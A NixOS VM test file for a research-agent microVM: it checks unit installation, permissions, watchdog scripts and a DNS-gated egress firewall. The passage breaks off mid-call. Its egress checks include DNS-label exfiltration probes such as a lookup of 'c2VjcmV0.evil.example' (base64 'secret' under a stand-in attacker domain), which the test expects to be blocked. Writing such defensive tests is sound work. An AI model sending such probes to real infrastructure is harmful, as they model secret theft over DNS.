# vm-microvm: research-agent microvm unit installation + agenix wiring.
#
# Asserts:
#   - install-microvm-research-agent.service exists and runs
#   - microvm@research-agent.service template lands in /etc/systemd/system
#   - /var/lib/research-agent/vm-ssh (host-side persisted ssh-host-keys
#     share) is created via systemd.tmpfiles, owner root mode 700
#   - /var/lib/research-agent/tool-cache/{prv,bolagsverket} (persistent
#     jail tool-cache share) created via systemd.tmpfiles, 0777 jonathan
#   - the guest's egress policy AT RUNTIME (nodes `agent` + `upstream`):
#     the agent node imports the very module the guest imports
#     (modules/nixos/research-agent-egress.nix) and resolves through a
#     fake upstream that serves api.ebay.com's real CNAME-chain shape
#     onto an "edge" address the test rotates. Asserted: a freshly
#     rotated address is connectable as soon as the agent resolves it;
#     an address the resolver never handed out is not, even for an
#     allowlisted name; an unlisted name (A, AAAA, PTR) is answered
#     NXDOMAIN by the agent's own resolver and the upstream never sees
#     the query (no DNS-label exfiltration); no guest process but
#     dnsmasq can query the upstream directly.
#
# Nested-VM gate: starting microvm@research-agent.service would require
# nested KVM in the outer test QEMU. Some CI / dev hosts don't expose
# /dev/kvm to nested guests, so this lane asserts that the module
# evaluates and its systemd unit landed. Full boot+ssh+egress smoke
# lives in interactive `nix run .#feature-vm` per the SessionStart
# HARD RULE.
#
# Run: nix build .#checks.x86_64-linux.vm-microvm -L
{ pkgs, inputs }:

let
  lib = pkgs.lib;

  # The real scraper's /health idle counters (research-agent
  # scraper/server.py, read from the pinned source at eval time). The fake
  # scraper below reports exactly these names, so the drained-roll subtests
  # hold the roll to the real contract. Root cause this pins: the fake once
  # said `sessions`, agreeing with a roll that read `.sessions` while the
  # real scraper says `open_sessions` — vm-microvm stayed green while the
  # real scraper could never be rolled.
  scraperHealthSrc = builtins.readFile "${inputs.researchAgentNew}/scraper/server.py";
  openSessionsKey = "open_sessions";
  pendingArtifactsKey = "pending_artifacts";
  idleKeysPinned = lib.all (k: lib.hasInfix "\"${k}\": " scraperHealthSrc) [ openSessionsKey pendingArtifactsKey ];

  # The fakes' own code digest. Internal to the stand-ins below, the way
  # research-agent's broker/scraper compute theirs: the nixos side never
  # hashes checkout content (it only reloads the broker and reads the
  # scraper's `stale`), so nothing here is compared with a nixos-side
  # value. sha256 over "<sha256(file)>  <relpath>\n" for every regular,
  # non-symlink file under the roots, minus __pycache__ and *.pyc.
  treeHashPy = pkgs.writeText "treehash.py" ''
    import hashlib, os, sys


    def tree_hash(pairs):
        items = []
        for base, rel in pairs:
            if os.path.isfile(base) and not os.path.islink(base):
                items.append((rel, base))
                continue
            for dirpath, dirnames, filenames in os.walk(base):
                dirnames[:] = [d for d in dirnames if d != "__pycache__"]
                for n in filenames:
                    p = os.path.join(dirpath, n)
                    if n.endswith(".pyc") or os.path.islink(p) or not os.path.isfile(p):
                        continue
                    items.append((rel + p[len(base):], p))
        items.sort(key=lambda t: t[0].encode())
        out = "".join(
            hashlib.sha256(open(p, "rb").read()).hexdigest() + "  " + r + "\n" for r, p in items
        )
        return hashlib.sha256(out.encode()).hexdigest()


    if __name__ == "__main__":
        root = sys.argv[1]
        print(tree_hash([(os.path.join(root, r), r) for r in sys.argv[2:]]))
  '';

  # Stand-in for research-agent's broker/server.py (that code lives in the
  # research-agent repo and has its own hermetic suite). It exercises the
  # UNIT, not the broker: serves both inherited sockets and reports what
  # the sandboxed process can see and reach, so the lane proves the
  # sandbox does not break what the real broker needs (credentials,
  # code dirs, scraper bearer, curl_cffi upstream calls, host :8123,
  # a persistent state dir) and does hide what it must not see. Like the
  # real broker (the contract research-agent implements) it answers GET
  # /admin/health with its code digest, and on SIGHUP recomputes the
  # digest of the code on disk: unchanged → keeps serving (a no-op,
  # recorded in $STATE_DIRECTORY/reloads); changed → exits 0 (graceful
  # reload: the next connection re-activates it on the new code). Every
  # start is appended to $STATE_DIRECTORY/starts.
  stubBroker = pkgs.writeText "stub-broker-server.py" ''
    import json, os, signal, socket, sys, threading
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
    from urllib.parse import parse_qs, urlparse

    from importlib.machinery import SourceFileLoader
    treehash = SourceFileLoader("treehash", "${treeHashPy}").load_module()

    def digest():
        return treehash.tree_hash([("/run/rb/broker", "broker"),
                                   ("/run/rb/scraper/urlpolicy.py", "scraper/urlpolicy.py")])


    CODE = digest()
    STATE = os.environ["STATE_DIRECTORY"]
    with open(os.path.join(STATE, "starts"), "a") as f:
        f.write(CODE + "\n")


    def attempt(fn):
        try:
            return ["ok", fn()]
        except Exception as e:
            return ["err", type(e).__name__]


    def http_get(url):
        from curl_cffi import requests
        return requests.get(url, timeout=10).status_code


    def write_code():
        with open("/run/rb/broker/x", "w") as f:
            f.write("x")


    def probe(listener, query):
        cdir = os.environ["CREDENTIALS_DIRECTORY"]
        out = {
            "listener": listener,
            "fdnames": os.environ.get("LISTEN_FDNAMES", ""),
            "uid": os.getuid(),
            "creds": {n: open(os.path.join(cdir, n)).read() for n in os.listdir(cdir)},
            "env_has_fake": any("FAKE-" in v for v in os.environ.values()),
            "home": attempt(lambda: sorted(os.listdir("/home"))),
            "write_code": attempt(write_code),
            "scraper_code": attempt(lambda: os.path.isdir("/run/rb/scraper")),
            "scraper_token": attempt(lambda: len(open("/var/lib/scraper-bearer/token").read()) > 0),
            "loopback_scraper": attempt(lambda: http_get("http://127.0.0.1:8123/")),
            "state_mode": oct(os.stat(STATE).st_mode & 0o777),
        }
        if "up" in query:
            out["upstream"] = attempt(lambda: http_get(query["up"][0]))
        return out


    class Handler(BaseHTTPRequestHandler):
        def address_string(self):
            return "peer"

        def do_GET(self):
            url = urlparse(self.path)
            if url.path == "/v1/health":
                body = b"ok"
            elif url.path == "/admin/health" and self.server.fdname == "admin":
                body = json.dumps({"code": CODE}).encode()
            elif url.path == "/probe":
                body = json.dumps(probe(self.server.fdname, parse_qs(url.query))).encode()
            else:
                self.send_error(404)
                return
            self.send_response(200)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)


    def on_hup(*_):
        now = digest()
        with open(os.path.join(STATE, "reloads"), "a") as f:
            f.write(("noop " if now == CODE else "exit ") + now + "\n")
        if now != CODE:
            os._exit(0)


    signal.signal(signal.SIGHUP, on_hup)
    assert int(os.environ["LISTEN_PID"]) == os.getpid()
    names = os.environ["LISTEN_FDNAMES"].split(":")
    threads = []
    for i in range(int(os.environ["LISTEN_FDS"])):
        srv = ThreadingHTTPServer(("127.0.0.1", 0), Handler, bind_and_activate=False)
        srv.socket.close()
        srv.socket = socket.socket(fileno=3 + i)
        srv.fdname = names[i]
        t = threading.Thread(target=srv.serve_forever)
        t.start()
        threads.append(t)
    # Main thread idles in pause() so the SIGHUP handler runs promptly.
    while True:
        signal.pause()
  '';

  # The scraper microVM, faked for the drained-roll subtests: runs as
  # microvm@scraper's ExecStart (through a runtime drop-in, so the unit
  # stays the real microvm.nix one) and serves GET /health on the hostfwd
  # address. Like the new scraper (the contract research-agent implements)
  # it reports the digest it booted with (`code`), the digest on its share
  # now (`disk_code`), `stale` when they differ, and the two idle
  # counters; with ./legacy present it
  # answers like today's scraper ({"status": "ok"} only), and an instance
  # booted while ./broken exists never answers ok (a guest that does not
  # come back).
  fakeScraperVm = pkgs.writeScript "fake-scraper-vm" ''
    #!${pkgs.python3}/bin/python3
    import json, os, time
    from http.server import BaseHTTPRequestHandler, HTTPServer
    from importlib.machinery import SourceFileLoader
    treehash = SourceFileLoader("treehash", "${treeHashPy}").load_module()

    D = "/run/fake-scraper"
    BROKEN = os.path.exists(f"{D}/broken")
    def digest():
        return treehash.tree_hash([("/home/jonathan/Repos/research-agent/scraper", "scraper")])


    CODE = digest()
    with open(f"{D}/boots", "a") as f:
        f.write(f"{time.time()} {CODE}\n")


    class H(BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path != "/health" or BROKEN:
                self.send_error(503)
                return
            if os.path.exists(f"{D}/legacy"):
                body = {"status": "ok"}
            else:
                disk = digest()
                body = {"status": "ok", "code": CODE, "disk_code": disk, "stale": disk != CODE,
                        **json.load(open(f"{D}/counters.json"))}
            raw = json.dumps(body).encode()
            self.send_response(200)
            self.send_header("Content-Length", str(len(raw)))
            self.end_headers()
            self.wfile.write(raw)

        def log_message(self, *a):
            pass


    HTTPServer(("127.0.0.1", 8123), H).serve_forever()
  '';

  # The research-agent microVM, faked the same way: an sshd on the
  # hostfwd address with the persisted host key, admitting `agent` with
  # the host-to-VM key — what the roll's readiness probe dials.
  fakeResearchVm = pkgs.writeShellScript "fake-research-vm" ''
    echo "$(date +%s)" >> /run/fake-vm/boots
    if [ -e /run/fake-vm/broken ]; then exec sleep infinity; fi
    exec ${pkgs.openssh}/bin/sshd -D -e -f /dev/null \
      -o ListenAddress=127.0.0.1:2223 \
      -o HostKey=/var/lib/research-agent/vm-ssh/ssh_host_ed25519_key \
      -o AuthorizedKeysFile=/run/fake-vm/authorized_keys \
      -o StrictModes=no -o PidFile=none -o UsePAM=yes -o PermitRootLogin=no
  '';

  # Runtime drop-ins that swap ONLY what the lane cannot run (qemu,
  # virtiofsd) for the fakes above; the microvm@ units, their
  # restartTriggers, set-booted and install-microvm stay microvm.nix's.
  fakeVmDropin = exec: pkgs.writeText "fake-vm.conf" ''
    [Service]
    User=root
    Group=root
    Type=simple
    ExecStart=
    ExecStart=${exec}
    ExecStop=
    ExecStartPost=
    ExecStopPost=
  '';
  noopDropin = pkgs.writeText "noop.conf" ''
    [Service]
    Type=oneshot
    RemainAfterExit=yes
    Restart=no
    ExecStart=
    ExecStart=${pkgs.coreutils}/bin/true
    ExecStop=
    ExecStopPost=
  '';
in
assert lib.assertMsg idleKeysPinned
  "vm-microvm: research-agent scraper/server.py /health no longer reports ${openSessionsKey} and ${pendingArtifactsKey}; the fake scraper and the roll must follow the real field names";
pkgs.testers.runNixOSTest {
  name = "vm-microvm";
  skipTypeCheck = true;

  nodes.workstation = { config, ... }: {
    # The primary workstation, as in tests/lib/common.nix (HM included).
    imports = [ (import ./lib/workstation-vm.nix { inherit (inputs) workstation; }) ];

    users.users.jonathan = {
      linger = true;
      initialPassword = lib.mkForce "test";
    };

    virtualisation = {
      memorySize = 4096;
      cores = 2;
      diskSize = 8192;
    };

    # microvm.nix test-mode overrides. The production host config tells
    # microvm.vms.research-agent to virtiofs-share three host dirs that
    # don't exist inside this nested test VM. Without stubs, virtiofsd
    # blocks ~5min waiting for sources and pushes multi-user.target
    # behind its timeout. We also disable the inner VM start: this lane
    # asserts unit *installation*, not boot. Full boot lives in
    # `nix run .#feature-vm`.
    systemd.tmpfiles.rules = [
      "d /home/jonathan/Repos 0755 jonathan users -"
      "d /home/jonathan/Repos/research-agent 0755 jonathan users -"
      "d /home/jonathan/Repos/research-agent/reports 0755 jonathan users -"
    ];
    systemd.services."install-microvm-research-agent".wantedBy =
      lib.mkForce [ ];
    systemd.services."microvm@research-agent".wantedBy = lib.mkForce [ ];
    systemd.services."microvm-virtiofsd@research-agent".wantedBy =
      lib.mkForce [ ];
    # Same stubs for the scraper sibling VM. This lane asserts unit
    # installation only; interactive boot lives in `nix run .#feature-vm`.
    systemd.services."install-microvm-scraper".wantedBy = lib.mkForce [ ];
    systemd.services."microvm@scraper".wantedBy = lib.mkForce [ ];
    systemd.services."microvm-virtiofsd@scraper".wantedBy = lib.mkForce [ ];

    # Drained-roll subtests: the fake research VM's sshd admits `agent`,
    # as the real guest does. And the roll's two clocks, shortened (prod:
    # 300 s scraper cap, 600 s readiness bound) — inputs, not criteria.
    users.users.agent.isNormalUser = true;
    # Store paths the testScript hands to this node. This node sees only
    # its own system closure (virtualisation.additionalPaths did not make
    # them visible), so pull them into it.
    environment.etc."vm-microvm-fixtures".source = pkgs.linkFarmFromDrvs "vm-microvm-fixtures" [
      treeHashPy stubBroker fakeScraperVm fakeResearchVm
      (fakeVmDropin "FAKE") noopDropin pkgs.python3 pkgs.curl
    ];
    researchAgent.roll.scraperQuietSeconds = 10;
    researchAgent.roll.readyTimeoutSeconds = 15;
  };

  # The research-agent guest's egress policy, run for real. Same module
  # the guest imports; only the upstream resolver differs (the guest's is
  # SLIRP's 10.0.2.3). IPv6 off as in the guest.
  nodes.agent = { nodes, pkgs, ... }: {
    imports = [ ../modules/nixos/research-agent-egress.nix ];
    researchAgent.egress.upstreamDns = nodes.upstream.networking.primaryIPAddress;
    networking.enableIPv6 = false;
    environment.systemPackages = [ pkgs.curl pkgs.dig ];
  };

  # The scraper guest's egress policy, run for real: same module the
  # scraper guest imports, on SLIRP's guest address. The API port is open
  # inbound as in the guest, with a stub listener.
  nodes.scraper = { pkgs, ... }: {
    imports = [ ../modules/nixos/scraper-egress.nix ];
    networking.enableIPv6 = false;
    networking.interfaces.eth1.ipv4.addresses = lib.mkAfter [
      { address = "10.0.2.15"; prefixLength = 24; }
      { address = "203.0.113.20"; prefixLength = 24; }
    ];
    networking.firewall.allowedTCPPorts = [ 8000 ];
    environment.systemPackages = [ pkgs.curl pkgs.dig ];
    systemd.services.fake-scraper-api = {
      wantedBy = [ "multi-user.target" ];
      script = ''
        mkdir -p /srv/api && echo api-ok > /srv/api/index.html
        exec ${pkgs.python3}/bin/python3 -m http.server 8000 --bind 0.0.0.0 --directory /srv/api
      '';
    };
  };

  # Stands in for "the internet": an authoritative-enough resolver plus a
  # TCP :443 listener on several addresses. api.ebay.com is served with
  # its real shape — a CNAME chain whose final A record (the Akamai edge)
  # the test rewrites to simulate rotation. evil.example is not on the
  # allowlist. Plain HTTP on :443 is enough: the guest rule is
  # `tcp dport 443`, TLS is irrelevant to the firewall. log-queries is
  # the witness for "the upstream never saw it".
  nodes.upstream = { pkgs, ... }: {
    networking.firewall.enable = false;
    environment.systemPackages = [ pkgs.dig ];
    networking.interfaces.eth1.ipv4.addresses = lib.mkAfter ((map
      (n: { address = "192.168.1.${toString n}"; prefixLength = 24; })
      [ 10 11 12 13 14 ])
      # For node `scraper`: SLIRP's host gateway (= host loopback in prod)
      # and DNS, plus an address outside every private range standing in
      # for "a public web server".
      ++ [
        { address = "10.0.2.2"; prefixLength = 24; }
        { address = "10.0.2.3"; prefixLength = 24; }
        { address = "203.0.113.10"; prefixLength = 24; }
      ]);
    services.dnsmasq = {
      enable = true;
      resolveLocalQueries = false;
      settings = {
        no-resolv = true;
        no-hosts = true;
        addn-hosts = "/run/fake-dns/hosts";
        cname = [
          "api.ebay.com,global-api.ebaycdn.net"
          "global-api.ebaycdn.net,ebay-edge.akamaiedge.net"
        ];
        local-ttl = 1;
        log-queries = true;
      };
    };
    systemd.tmpfiles.rules = [ "d /run/fake-dns 0755 root root -" ];
    systemd.services.dnsmasq.preStart = lib.mkBefore ''
      printf '192.168.1.10 ebay-edge.akamaiedge.net\n192.168.1.12 evil.example\n192.168.1.14 api.exa.ai\n' \
        > /run/fake-dns/hosts
    '';
    systemd.services.fake-cdn = {
      wantedBy = [ "multi-user.target" ];
      script = ''
        mkdir -p /srv/cdn && echo ok > /srv/cdn/index.html
        exec ${pkgs.python3}/bin/python3 -m http.server 443 --bind 0.0.0.0 --directory /srv/cdn
      '';
    };
  };

  testScript = { nodes, ... }: ''
    workstation.wait_for_unit("multi-user.target")

    # microvm.nix install-microvm-<name> oneshot exists and runs cleanly.
    # We disabled `wantedBy = [ multi-user.target ]` in the test
    # overrides, so trigger it explicitly to materialize the per-VM
    # files under /var/lib/microvms/<name>.
    workstation.succeed("systemctl start install-microvm-research-agent.service")
    workstation.succeed("test -d /var/lib/microvms/research-agent")
    workstation.succeed(
        "systemctl cat microvm@research-agent.service "
        "| grep -q 'Description='"
    )

    # The generated qemu runner must never pass exactly -m 2048: qemu's
    # microvm machine serves a corrupt DSDT when guest RAM ends exactly
    # at the 2 GiB boundary (microvm-nix/microvm.nix#171) and the guest
    # wedges pre-init, pinning a host core. Assert on the materialized
    # runner — the artifact qemu actually execs — not on the .nix source.
    workstation.fail(
        "grep -qE -- '-m 2048( |$)' "
        "/var/lib/microvms/research-agent/current/bin/microvm-run"
    )

    # Persisted vm-ssh state dir must be in place before the VM boots.
    # The host module's systemd.tmpfiles.rules are the load-bearing piece.
    workstation.succeed("test -d /var/lib/research-agent/vm-ssh")
    perms = workstation.succeed(
        "stat -c '%a %U' /var/lib/research-agent/vm-ssh"
    ).strip()
    assert perms == "700 root", (
        f"vm-ssh dir perms expected '700 root', got {perms!r}"
    )

    # Persistent tool-cache dirs (PRV / Bolagsverket SQLite indexes,
    # shared RW into the jail). 0777 is the load-bearing part: writes
    # from inside the bwrap --unshare-user jail arrive as a non-owner
    # uid, so anything tighter breaks index builds (same empirical
    # reason run-agent.sh chmods its report file 666).
    for sub in ["prv", "bolagsverket"]:
        perms = workstation.succeed(
            f"stat -c '%a %U' /var/lib/research-agent/tool-cache/{sub}"
        ).strip()
        assert perms == "777 jonathan", (
            f"tool-cache/{sub} perms expected '777 jonathan', got {perms!r}"
        )

    # Health-check watchdog: the script must defer to operator-stopped
    # state cleanly, and the systemctl-restart command name must appear in the script body (a
    # rename of the microvm unit would silently break the watchdog).
    script_path = workstation.succeed(
        "systemctl cat research-agent-healthcheck.service "
        "| awk -F= '/^ExecStart=/{print $2}' | tr -d '\"'"
    ).strip()
    # Match the literal command issued on restart. --no-block keeps the
    # oneshot bounded (the unit's TimeoutStartSec is 30s); a regression
    # back to synchronous restart would let stuck activations stack
    # behind the 1-min timer.
    workstation.succeed(
        f"grep -q 'systemctl restart --no-block microvm@research-agent.service' {script_path}"
    )
    # Give-up latch: the watchdog must cap fruitless restarts (burst
    # counter + gave-up flag) and write the notification flag file the
    # user-session path unit watches. A regression to restart-forever
    # recreates the 2026-06-05 incident: a boot-wedged guest restart-
    # looped 62×/6h, silently pinning a host core the whole time.
    # Probe MUST pass `-t ed25519`, matching the guest's own hostKeys.
    # Without it, ssh-keyscan also probes rsa and ecdsa; the guest serves
    # neither, and those attempts hang until -T rather than failing
    # fast, so the probe intermittently fails against a healthy VM.
    # Measured 2026-07-31 on the live host: default scan 12/20 vs 18/20
    # with -t ed25519, driving 35-49 spurious restarts a day (321 in 8
    # days). The flag is derived from the guest's own
    # services.openssh.hostKeys, so this assertion also catches an
    # empty-list regression: the throw at eval time is the primary
    # guard, and `-t <empty> -p` would produce `-t -p 2223` after bash
    # collapses the double space, which ssh-keyscan answers with
    # "Unknown key type '-p'" and every probe fails unconditionally.
    for unit, port in (("research-agent-healthcheck", "2223"),
                       ("scraper-healthcheck", "2225")):
        probe = workstation.succeed(
            f"grep -ho 'ssh-keyscan[^|]*' "
            f"$(systemctl cat {unit}.service | sed -n 's/^ExecStart=//p')"
        )
        assert f"-t ed25519 -p {port}" in probe, (
            f"{unit} must scan only the ed25519 host key its guest serves, got: {probe}"
        )
        assert "-t  -p" not in probe and "-t -p" not in probe, (
            f"{unit} probe has empty -t argument (would fail every probe): {probe}"
        )

    workstation.succeed(f"grep -q 'restart-burst-count' {script_path}")
    workstation.succeed(f"grep -q 'GIVING UP' {script_path}")
    workstation.succeed(
        f"grep -q '/run/microvm-healthcheck-notify/research-agent' {script_path}"
    )
    # Offline gate: probe failures while the HOST is offline must not
    # count toward restarts/give-up (2026-07-07 false "VM DOWN"
    # incident). Precautionary since the guest stopped holding sshd
    # back on DNS; see research-agent-microvm-healthcheck.nix.
    workstation.succeed(f"grep -q 'host is offline' {script_path}")
    workstation.succeed(f"grep -q 'getent ahostsv4' {script_path}")
    # Busy gate: while a research call is dialing the VM the MCP keeps a
    # heartbeat fresh; the watchdog must NOT count a failed probe (and so
    # must not restart) while it's fresh — otherwise it kills the in-flight
    # research call (the 2026-07-30 mid-run-restart failure). Assert the
    # gate is wired and the shared /run dir is jonathan-writable so the
    # MCP can actually touch the heartbeat.
    workstation.succeed(f"grep -q '/run/research-agent/active' {script_path}")
    workstation.succeed(f"grep -q 'a research call is active' {script_path}")
    workstation.succeed("test -d /run/research-agent")
    aperms = workstation.succeed("stat -c '%a %U' /run/research-agent").strip()
    assert aperms == "755 jonathan", (
        f"/run/research-agent perms expected '755 jonathan', got {aperms!r}"
    )
    # Wedge-snapshot instrumentation: before the recovery restart destroys
    # the wedged qemu, the watchdog must capture the guest console (streamed
    # to the journal via the qemu stdio chardev) to a persistent, pruned
    # file — the only window the warm-reboot second-boot failure is still on
    # record. Assert the logic is wired and the persistent dir is root-only.
    workstation.succeed(f"grep -q 'snapshot_console' {script_path}")
    workstation.succeed(f"grep -q 'wedge-logs' {script_path}")
    workstation.succeed(
        f"grep -q 'journalctl -u microvm@research-agent.service' {script_path}"
    )
    workstation.succeed("test -d /var/lib/research-agent/wedge-logs")
    wperms = workstation.succeed(
        "stat -c '%a %U' /var/lib/research-agent/wedge-logs"
    ).strip()
    assert wperms == "700 root", (
        f"wedge-logs dir perms expected '700 root', got {wperms!r}"
    )
    # Notification chain: flag dir exists and is world-readable so the
    # user session can inotify it.
    notify_perms = workstation.succeed(
        "stat -c '%a %U' /run/microvm-healthcheck-notify"
    ).strip()
    assert notify_perms == "755 root", (
        f"notify flag dir perms expected '755 root', got {notify_perms!r}"
    )
    # Probe should treat operator-stopped microvm as a no-op (exit 0
    # silently) — otherwise an admin `systemctl stop microvm@...` would
    # be fought by the watchdog. The microvm unit is stopped in this
    # test (wantedBy mkForce []), so a fresh run must exit 0.
    workstation.succeed("systemctl start research-agent-healthcheck.service")

    # Count-file corruption MUST NOT brick the watchdog. Under `set -u`
    # without sanitization, non-numeric input would crash the
    # arithmetic and leave the script aborting forever each tick.
    # read_int must clamp garbage back to 0.
    workstation.succeed(
        "mkdir -p /run/research-agent-healthcheck "
        "&& printf 'abc\\n0\\n5garbage' > /run/research-agent-healthcheck/fail-count"
    )
    workstation.succeed("systemctl start research-agent-healthcheck.service")
    # Service must reach 'inactive' (oneshot exited 0), not 'failed'.
    rc = workstation.succeed(
        "systemctl is-failed research-agent-healthcheck.service || true"
    ).strip()
    assert rc != "failed", (
        f"watchdog must survive corrupted state file; got is-failed={rc!r}"
    )

    # ---------------------------------------------------------------
    # scraper microvm — same shape of assertions as research-agent,
    # plus the bearer-token init service that gates both VMs.
    # ---------------------------------------------------------------
    workstation.succeed("systemctl start install-microvm-scraper.service")
    workstation.succeed("test -d /var/lib/microvms/scraper")

    # Every host forward of both VMs binds host loopback, never 0.0.0.0.
    # QEMU reads `hostfwd=tcp::P-:G` (empty address, microvm.nix's
    # default) as "all interfaces", which left the scraper API, both
    # sshds and through them the guests reachable from the LAN with only
    # the host firewall in the way. Asserted on the runner qemu execs.
    for vm, fwds in (("research-agent", ["2223-:22"]),
                     ("scraper", ["2225-:22", "8123-:8000"])):
        runner = f"/var/lib/microvms/{vm}/current/bin/microvm-run"
        found = workstation.succeed(f"grep -oE 'hostfwd=tcp:[^,]*' {runner} | sort -u").split()
        print(f"[diag] {vm} hostfwds: {found}")
        assert sorted(found) == sorted(f"hostfwd=tcp:127.0.0.1:{f}" for f in fwds), (
            f"{vm}: expected loopback-only hostfwds for {fwds}, got {found}"
        )
    workstation.succeed(
        "systemctl cat microvm@scraper.service | grep -q 'Description='"
    )

    # Persisted scraper state dirs must be in place before the VM boots.
    workstation.succeed("test -d /var/lib/scraper/vm-ssh")
    perms = workstation.succeed(
        "stat -c '%a %U' /var/lib/scraper/vm-ssh"
    ).strip()
    assert perms == "700 root", (
        f"scraper vm-ssh dir perms expected '700 root', got {perms!r}"
    )

    # Bearer-token init service must exist and produce a token file when
    # invoked. The token is regenerated on every boot; consumers read it
    # via virtiofs on demand, so rotation = a single `systemctl restart`.
    workstation.succeed("test -d /var/lib/scraper-bearer")
    perms = workstation.succeed(
        "stat -c '%a %U' /var/lib/scraper-bearer"
    ).strip()
    assert perms == "755 root", (
        f"scraper-bearer dir perms expected '755 root', got {perms!r}"
    )
    workstation.succeed("systemctl start scraper-bearer-init.service")
    workstation.succeed("test -s /var/lib/scraper-bearer/token")
    token_perms = workstation.succeed(
        "stat -c '%a %U' /var/lib/scraper-bearer/token"
    ).strip()
    assert token_perms == "444 root", (
        f"scraper token file perms expected '444 root', got {token_perms!r}"
    )
    # Token shape: base64url, ~43 ASCII chars, no '=' / '+' / '/'.
    token_body = workstation.succeed(
        "cat /var/lib/scraper-bearer/token"
    ).strip()
    assert len(token_body) >= 32, (
        f"scraper token too short: got {len(token_body)} chars"
    )
    assert all(
        c.isalnum() or c in "-_" for c in token_body
    ), f"scraper token contains non-base64url chars: {token_body!r}"

    # Research-agent ↔ scraper egress allow rule is structurally inside
    # the guest VM's nftables ruleset, not visible from this outer test
    # node. The interactive `nix run .#feature-vm` lane covers end-to-end
    # reachability (render_shim posting to the scraper); skip a brittle
    # grep here.

    # ---------------------------------------------------------------
    # scraper healthcheck — mirror of research-agent watchdog.
    # ---------------------------------------------------------------
    scraper_script = workstation.succeed(
        "systemctl cat scraper-healthcheck.service "
        "| awk -F= '/^ExecStart=/{print $2}' | tr -d '\"'"
    ).strip()
    # Must restart the scraper unit (not research-agent's) on persistent
    # failure. A rename of the microvm unit would silently break this.
    workstation.succeed(
        f"grep -q 'systemctl restart --no-block microvm@scraper.service' {scraper_script}"
    )
    # Give-up latch + notify chain — mirror of the research-agent
    # assertions above.
    workstation.succeed(f"grep -q 'restart-burst-count' {scraper_script}")
    workstation.succeed(f"grep -q 'GIVING UP' {scraper_script}")
    workstation.succeed(
        f"grep -q '/run/microvm-healthcheck-notify/scraper' {scraper_script}"
    )
    # Probe operator-stopped microvm as a no-op (the scraper unit is
    # stopped in this test via wantedBy mkForce []), exit 0 silently.
    workstation.succeed("systemctl start scraper-healthcheck.service")
    rc = workstation.succeed(
        "systemctl is-failed scraper-healthcheck.service || true"
    ).strip()
    assert rc != "failed", (
        f"scraper watchdog must survive operator-stopped VM; got is-failed={rc!r}"
    )
    # Corrupted state file must NOT brick the watchdog (read_int clamp).
    workstation.succeed(
        "mkdir -p /run/scraper-healthcheck "
        "&& printf 'abc\\n0\\n5garbage' > /run/scraper-healthcheck/fail-count"
    )
    workstation.succeed("systemctl start scraper-healthcheck.service")
    rc = workstation.succeed(
        "systemctl is-failed scraper-healthcheck.service || true"
    ).strip()
    assert rc != "failed", (
        f"scraper watchdog must survive corrupted state; got is-failed={rc!r}"
    )

    # ---------------------------------------------------------------
    # research-agent guest egress, at runtime (nodes agent + upstream).
    # ---------------------------------------------------------------
    upstream.start()
    agent.start()
    upstream.wait_for_unit("dnsmasq.service")
    upstream.wait_for_unit("fake-cdn.service")
    upstream.wait_for_open_port(443)
    agent.wait_for_unit("multi-user.target")
    agent.wait_for_unit("dnsmasq.service")
    agent.wait_for_unit("systemd-resolved.service")

    def set_edge(ip):
        # Rotate api.ebay.com's final A record, as Akamai does every few
        # seconds. local-ttl=1 + no caching on the agent side means the
        # next lookup sees it; sleep past the TTL anyway.
        upstream.succeed(
            f"printf '{ip} ebay-edge.akamaiedge.net\\n192.168.1.12 evil.example\\n192.168.1.14 api.exa.ai\\n' "
            "> /run/fake-dns/hosts && systemctl reload dnsmasq.service"
        )
        agent.sleep(2)

    def connect(name, extra=""):
        # %{remote_ip}: which address the agent actually reached.
        return agent.succeed(
            f"curl -sS -m 5 -o /dev/null -w '%{{remote_ip}}' {extra} http://{name}:443/"
        ).strip()

    def egress_set():
        return agent.succeed("nft list set inet filter research_allowed")

    # Nothing has been resolved yet, so nothing is allowed yet.
    print("[diag] set at boot:\n" + egress_set())
    assert "192.168.1." not in egress_set(), "egress set must start empty"

    # 1. Allowlisted name behind a CNAME chain: reachable, via the edge.
    ip = connect("api.ebay.com")
    assert ip == "192.168.1.10", f"expected edge 192.168.1.10, reached {ip!r}"

    # 2. The edge rotates to an address nobody has seen before. The
    #    boot-time/10-min-refresh design failed exactly here.
    set_edge("192.168.1.11")
    ip = connect("api.ebay.com")
    assert ip == "192.168.1.11", f"rotated edge not reached, got {ip!r}"

    # 3. Rotate again, but connect to the new address WITHOUT asking the
    #    resolver: allowlisted name or not, an address the resolver never
    #    handed out stays closed. Then resolve normally: open.
    set_edge("192.168.1.13")
    agent.fail(
        "curl -sS -m 5 -o /dev/null --resolve api.ebay.com:443:192.168.1.13 "
        "http://api.ebay.com:443/"
    )
    ip = connect("api.ebay.com")
    assert ip == "192.168.1.13", f"edge not opened by resolution, got {ip!r}"

    assert "192.168.1.10" in egress_set(), "resolved edge address must be in the egress set"

    # 4. Unlisted names never leave the guest as DNS. Control first: the
    #    upstream itself WOULD answer evil.example, so the NXDOMAIN below
    #    is the agent's resolver refusing to forward, not the upstream.
    upstream.succeed("dig +short @127.0.0.1 evil.example | grep -qx 192.168.1.12")
    for name in ["exfil-test.example.com", "c2VjcmV0.evil.example"]:
        agent.fail(f"getent ahostsv4 {name}")
        for qtype in ["A", "AAAA"]:
            status = agent.succeed(
                f"dig +time=3 +tries=1 @127.0.0.1 {name} {qtype} | grep -o 'status: [A-Z]*'"
            ).strip()
            assert status == "status: NXDOMAIN", f"{name} {qtype}: {status!r}"
    # Reverse lookup of an address /etc/hosts doesn't name (dnsmasq
    # answers the test nodes' own addresses from /etc/hosts, locally).
    status = agent.succeed(
        "dig +time=3 +tries=1 @127.0.0.1 -x 203.0.113.7 | grep -o 'status: [A-Z]*'"
    ).strip()
    assert status == "status: NXDOMAIN", f"PTR 203.0.113.7: {status!r}"
    upstream_log = upstream.succeed("journalctl -u dnsmasq.service --no-pager")
    # Positive control: the log does record what the agent forwarded.
    assert "query[A] api.ebay.com from" in upstream_log, "upstream query log not working"
    for leaked in ["exfil-test", "c2VjcmV0", "7.113.0.203.in-addr.arpa"]:
        assert leaked not in upstream_log, f"{leaked!r} reached the upstream resolver"
    # And the firewall still holds for the unlisted name's address even
    # if the agent already knows it.
    upstream.succeed("curl -sS -m 5 -o /dev/null http://192.168.1.12:443/")
    agent.fail(
